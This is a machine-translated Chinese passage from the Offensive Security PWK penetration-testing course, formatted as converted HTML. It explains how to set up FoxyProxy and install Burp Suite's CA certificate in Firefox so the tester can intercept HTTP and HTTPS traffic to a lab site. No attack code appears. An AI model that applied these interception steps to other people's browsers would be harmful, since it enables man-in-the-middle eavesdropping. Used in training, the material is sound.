<div style="position:absolute;top:47170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦我们接受 FoxyProxy Basic 的权限，我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">完成安装。</font><font style="vertical-align: inherit;">一种</font></font></nobr></div>
<div style="position:absolute;top:47189;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FoxyProxy 的欢迎页面将在安装完成后自动打开。</font><font style="vertical-align: inherit;">我们应该</font></font></nobr></div>
<div style="position:absolute;top:47209;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">URL 栏右侧还有一个新图标： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:47695;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="41"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 41 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:47728;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:48805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:48805;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:48805;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">261</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:48260;left:352"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 102：FoxyProxy 基本快捷方式</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:48291;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FoxyProxy 默认是禁用的。</font><font style="vertical-align: inherit;">我们可以通过查看图标来直观地验证这一点。</font><font style="vertical-align: inherit;">如果有红色</font></font></nobr></div>
<div style="position:absolute;top:48311;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">带有斜线的圆圈，附加组件被禁用。</font><font style="vertical-align: inherit;">在启用它之前，我们需要添加一个配置文件。</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:48883;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="42"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 42 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:48916;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:49993;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:49993;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:49993;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">262</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:49006;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.9</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49027;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，我们将点击小狐狸头图标打开配置屏幕并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:49496;left:352"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 103：FoxyProxy 基本快捷方式 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:50071;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="43"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 43 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:50104;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:51181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:51181;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:51181;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">263</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:50194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.10</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50215;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在Options页面上，我们将点击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">添加</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，打开“添加代理”屏幕。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50601;left:354"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 104：FoxyProxy 基本选项 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:51259;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="44"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 44 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:51292;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:52369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:52369;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:52369;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">264</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:51382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.11</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要为 Burp Suite 设置配置文件，我们首先将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">代理类型</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为“HTTP”，</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标题</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输入“Burp” </font><font style="vertical-align: inherit;">，</font></font></nobr></div>
<div style="position:absolute;top:51422;left:109"><nobr><font style="vertical-align: inherit;"></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">IP 地址</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为“127.0.0.1” </font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">此外，我们将添加 Burp Suite 代理侦听器端口号，</font></font></nobr></div>
<div style="position:absolute;top:51441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们将其保留为默认值 8080。最后，我们将单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Save</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51933;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 105：Burp Suite 的 FoxyProxy 基本设置 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:52447;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="45"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 45 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:52480;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:53557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:53557;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:53557;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">265</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:52570;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.12</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">保存后，我们将在“选项”页面上看到我们的新代理。</font><font style="vertical-align: inherit;">我们可以通过点击启用它</font></font></nobr></div>
<div style="position:absolute;top:52610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">再次单击 FoxyProxy 图标，然后单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Use proxy Burp for all URLs (ignore patterns)</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:53076;left:342"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 106：选择 FoxyProxy 配置文件 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:53635;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="46"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 46 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:53668;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:54745;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:54745;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:54745;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">266</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:53758;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.13</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:53779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">FoxyProxy 图标不应再被划掉，它应在图标上显示“Burp”。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:54245;left:338"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 107：验证 FoxyProxy 是否已启用 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:54823;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="47"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 47 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:54856;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:55933;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:55933;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:55933;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">267</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:54946;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.14</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:54967;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用代理后，我们可以关闭任何额外打开的选项卡并浏览到</font></font></nobr></div>
<div style="position:absolute;top:54986;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">http://www.megacorpone.com。</font><font style="vertical-align: inherit;">我们应该在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proxy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP History</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下看到 BurpSuite 中的流量</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:55473;left:356"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 108：Burp Suite HTTP 历史记录</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:55504;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果浏览器在加载页面时挂起，则可能启用了拦截。</font><font style="vertical-align: inherit;">将其关闭将允许</font></font></nobr></div>
<div style="position:absolute;top:55523;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">流量畅通无阻。</font><font style="vertical-align: inherit;">当我们浏览其他页面时，我们应该会看到更多请求</font></font></nobr></div>
<div style="position:absolute;top:55543;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTP 历史记录</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项卡中。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:55605;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为什么detectportal.firefox.com 不断出现在代理历史记录中？</font><font style="vertical-align: inherit;">一种</font></font></i></nobr></div>
<div style="position:absolute;top:55624;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">强制门户</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">246</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">是一个网页，当</font></font></i></nobr></div>
<div style="position:absolute;top:55644;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">试图浏览互联网。</font><font style="vertical-align: inherit;">经常在接受用户时显示</font></font></i></nobr></div>
<div style="position:absolute;top:55663;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">协议或通过浏览器验证到 Wi-Fi 网络。</font><font style="vertical-align: inherit;">忽视</font></font></i></nobr></div>
<div style="position:absolute;top:55682;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只需</font><font style="vertical-align: inherit;">在地址栏中</font><font style="vertical-align: inherit;">输入</font></font><font color="#000000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">about:config</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即可。</font><font style="vertical-align: inherit;">Firefox 会发出警告</font></font></i></nobr></div>
<div style="position:absolute;top:55702;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但我们可以点击“我接受风险！”继续。</font><font style="vertical-align: inherit;">最后，搜索</font></font></i></nobr></div>
<div style="position:absolute;top:55721;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“network.captive-portal-service.enabled”并双击它以更改值</font></font></i></nobr></div>
<div style="position:absolute;top:55741;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为“假”。</font><font style="vertical-align: inherit;">这将防止这些消息出现在代理历史记录中。</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:55883;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">246 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Captive_portal</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:56011;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="48"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 48 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:56044;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:57121;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:57121;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:57121;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">268</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56140;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此时，Firefox 现在正在通过 Burp Suite 代理其所有流量。</font><font style="vertical-align: inherit;">到目前为止，我们只</font></font></nobr></div>
<div style="position:absolute;top:56159;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看明文 HTTP 流量。</font><font style="vertical-align: inherit;">但是，如果我们在代理流量时浏览 HTTPS 站点</font></font></nobr></div>
<div style="position:absolute;top:56178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Burp（例如 https://www.google.com），我们将收到“无效证书”警告：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:56643;left:312"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 109：Firefox 中的不安全连接警告</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:56674;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Burp 可以通过生成自己的 SSL/TLS 证书轻松解密 HTTPS 流量，本质上是人工</font></font></nobr></div>
<div style="position:absolute;top:56693;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中间</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">247</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们自己以捕获流量。</font><font style="vertical-align: inherit;">这些警告可能会令人恼火，但我们</font></font></nobr></div>
<div style="position:absolute;top:56713;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可以通过颁发新证书并将其导入 Firefox 来阻止它们。</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:57071;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">247 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Man-in-the-middle_attack</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:57199;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="49"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 49 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:57232;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:58309;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:58309;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:58309;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">269</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:57322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.15</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57343;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">即使每个 Burp Suite CA 证书都应该是唯一的，我们将通过重新生成它来确保这一点。</font></font></nobr></div>
<div style="position:absolute;top:57362;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们将导航到</font><font style="vertical-align: inherit;">BurpSuite 中的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proxy</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Options</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> &gt; </font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Proxy Listeners</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Regenerate</font></font></i></nobr></div>
<div style="position:absolute;top:57381;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CA证书</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如下图：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:57869;left:326"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 110：重新生成 Burp 的 CA 证书</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:57899;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在确认对话框中</font><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Yes</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并重新启动 Burp Suite。</font></font></nobr></div>
<div style="position:absolute;top:57932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要将新的 CA 证书导入 Firefox，我们将首先浏览到 http://burp 以找到指向</font></font></nobr></div>
<div style="position:absolute;top:57952;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">证书：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:58179;left:367"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 111：Burp 欢迎页面 </font></font></i></nobr></div>
</span></font>

<div style="position:absolute;top:58387;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="50"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 50 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:58420;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:59497;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:59497;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:59497;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">270</font></font></nobr></div>
</span></font>
<font size="2" color="#ffffff" face="Times"><span style="font-size:5px;font-family:Times;color:#ffffff">
<div style="position:absolute;top:58510;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">9.3.3.1.16</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:58531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">要查看证书，我们</font><font style="vertical-align: inherit;">在此屏幕上</font><font style="vertical-align: inherit;">单击</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CA 证书</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（或连接到 http://burp/cert）并</font></font></nobr></div>
<div style="position:absolute;top:58550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将 cacert.der 文件保存到我们的本地机器。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59016;left:315"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 112：下载 Burp Suite 证书</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59047;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">下载完成后，我们可以将下载的文件拖放到Firefox中，选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信任</font></font></i></nobr></div>
<div style="position:absolute;top:59067;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此 CA 以识别网站</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">并单击“</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">确定”</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:59372;left:330"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 113：将证书导入 Firefox</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:59403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了验证导入是否成功，我们可以再次浏览到使用 HTTPS 的站点，例如</font></font></nobr></div>
<div style="position:absolute;top:59422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">https://www.google.com，它应该在没有警告的情况下加载并在其中生成 HTTPS 流量</font></font></nobr></div>
<div style="position:absolute;top:59442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">BurpSuite 的 HTTP 历史记录选项卡。 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:59575;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="51"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 51 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:59608;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
